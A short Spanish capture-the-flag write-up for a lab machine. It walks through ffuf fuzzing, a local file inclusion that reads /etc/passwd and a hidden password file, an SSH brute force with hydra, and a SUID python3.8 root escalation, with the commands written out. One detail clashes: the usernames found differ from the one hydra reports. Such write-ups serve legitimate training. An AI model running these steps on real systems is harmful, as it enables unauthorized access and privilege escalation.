PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Nos encontramos un servidor Apache Default

-Hacemos fuzzing de directorios y encontramos la ruta /index.php. Dentro nos dicen que hay un archivo oculto en --> ./var/www/html/.hidden_pass

-Hacemos fuzzing de parámetros y encontramos el parámetro 'page':
	-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://patriaquerida/index.php?FUZZ=id" -c -fs 110
		-page

-Aprovechamos el LFI (Local File Inclusion) que se nos brinda a partir del parámetro 'page' y listamos el contenido del archivo '.hidden_pass':
	-http://patriaquerida/index.php?page=/etc/passwd
		-Usuarios --> mario y pinguinazo
	-http://patriaquerida/index.php?page=/var/www/html/.hidden_pass
		-Contenido de la contraseña --> balu

-Metemos los usuarios en un fichero users.txt y aplicamos fuerza bruta con hydra aportando la contraseña obtenida:
	-hydra ssh://172.17.0.2 -L users.txt -p balu -V
		login: pinguino   password: balu

-Nos conectamos por ssh con las credenciales y obtenemos acceso a la máquina:
	-ssh pinguino@172.17.0.2
	-password: balu
	pinguino@dockerlabs:~$


## Escalada de Privilegios

-Buscamos binarios con permisos SUID y encontramos el siguiente:
	-/usr/bin/python3.8

-Buscamos en Gtfobins y escalamos a root:
	-/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	# whoami
	root
